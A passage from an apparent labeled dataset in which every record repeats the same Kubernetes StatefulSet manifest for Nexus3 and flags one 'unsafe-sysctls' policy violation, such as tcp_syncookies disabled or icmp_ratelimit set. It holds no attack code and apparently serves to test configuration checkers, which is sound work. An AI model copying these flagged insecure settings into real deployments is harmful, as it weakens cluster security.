value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.icmp_ratelimit\"."
  },
  {
    "id": "2169",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.ip_local_port_range\"."
  },
  {
    "id": "2170",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.ip_unprivileged_port_start\"."
  },
  {
    "id": "2171",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_abort_on_overflow\"."
  },
  {
    "id": "2172",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_adv_win_scale\"."
  },
  {
    "id": "2173",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_ecn\"."
  },
  {
    "id": "2174",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_fack\"."
  },
  {
    "id": "2175",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_fastopen\"."
  },
  {
    "id": "2176",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_fin_timeout\"."
  },
  {
    "id": "2177",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "unsafe-sysctls",
    "violation_text": "resource specifies unsafe sysctl \"net.ipv4.tcp_fwmark_accept\"."
  },
  {
    "id": "2178",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
